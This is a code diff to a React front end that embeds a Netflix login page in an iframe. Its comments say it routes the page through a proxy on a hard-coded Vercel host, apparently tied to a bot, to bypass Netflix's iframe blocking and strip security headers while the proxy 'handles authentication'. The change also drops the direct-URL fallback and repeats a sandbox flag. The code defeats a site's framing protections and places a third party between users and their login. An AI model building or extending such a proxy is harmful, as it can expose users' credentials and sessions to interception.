@@ -26,7 +26,11 @@ export default function App() {
         
         // Route through the Flask proxy to bypass Netflix's iframe blocking
         // The proxy handles authentication and strips security headers
-        const proxyUrl = `${window.location.origin}/go?url=${encodeURIComponent(decodedUrl)}`;
+        // Use the PUBLIC_URL from the bot (e.g., https://netflix-mobile-login-web.vercel.app/)
+        const baseUrl = window.location.origin.includes('localhost') 
+          ? window.location.origin 
+          : 'https://netflix-mobile-login-web.vercel.app';
+        const proxyUrl = `${baseUrl}/go?url=${encodeURIComponent(decodedUrl)}`;
         setProxiedUrl(proxyUrl);
       }
     }
@@ -84,12 +88,12 @@ export default function App() {
       {netflixUrl && !error ? (
         <iframe
           id="netflix-iframe"
-          src={proxiedUrl || netflixUrl}
+          src={proxiedUrl}
           className="netflix-iframe"
           onLoad={handleIframeLoad}
           onError={handleIframeError}
           allow="camera; microphone; payment; usb; magnetometer; gyroscope; accelerometer"
-          sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-presentation allow-top-navigation allow-top-navigation-by-user-activation"
+          sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-presentation allow-top-navigation allow-top-navigation-by-user-activation allow-same-origin"
         />
       ) : !error && (
         <div className="error-container">
